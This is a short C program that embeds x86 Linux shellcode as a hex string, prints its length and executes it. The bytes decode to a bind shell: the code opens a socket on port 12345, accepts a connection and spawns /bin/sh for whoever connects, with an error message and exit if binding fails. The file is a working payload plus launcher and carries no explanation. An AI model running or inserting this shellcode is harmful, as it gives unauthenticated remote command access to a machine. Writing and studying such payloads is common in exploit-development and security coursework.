#include "stdio.h"
 
int main(int argc, char *argv[])
{
 
char shellcode[]
="\x6a\x66\x58\x31\xdb\x31\xc9\xb3\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x6a\x66\x58\x6a\x02\x5b\x56\x66\x68\x30\x39\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x39\xf0\x75\x3c\x6a\x66\x58\x6a\x04\x5b\x56\x57\x89\xe1\xcd\x80\x6a\x66\x58\x6a\x05\x5b\x56\x56\x57\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x99\xb0\x0b\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xf1\xcd\x80\x6a\x04\x58\x6a\x15\x5a\x6a\x01\x5b\x56\x68\x63\x6b\x65\x74\x68\x67\x20\x53\x6f\x68\x6e\x64\x69\x6e\x68\x72\x20\x42\x69\x68\x45\x72\x72\x6f\x89\xe1\xcd\x80\x31\xc0\xb0\x01\xcd\x80";
 
printf("Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
 
return 0;
}

